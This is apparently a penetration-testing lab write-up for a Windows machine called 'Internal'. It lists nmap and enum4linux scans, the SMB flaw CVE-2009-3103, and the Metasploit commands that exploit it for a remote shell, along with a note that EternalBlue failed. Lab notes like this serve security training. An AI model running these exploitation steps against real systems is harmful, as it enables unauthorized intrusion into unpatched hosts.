# Internal

## Enumeration & scanning

- No special ports are open, default Windows ones such as SMB and RDP.
- SMB can be used to learn more about system and OS version.
- OS version seems relatively low.
- Nmap finds vulnerability in SMB (CVE-2009-3103)

``` sh
# Standard scanning
sudo nmap -p- 192.168.163.40
sudo nmap -p 135,139,445,3389,5357 -A 192.168.163.40
nmap --script=vuln 192.168.163.40 
enum4linux -a 192.168.163.40  

# msfconsole
auxiliary(scanner/smb/smb_version) > run
```

## Exploitation

- Leverage SMB vulnerability to get RCE via Metasploit.

``` sh
# msfconsole
search type:exploit platform:windows target:2008 smb
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
shell
```


## References


## Rabbit holes

- EternalBlue exploit did not work.
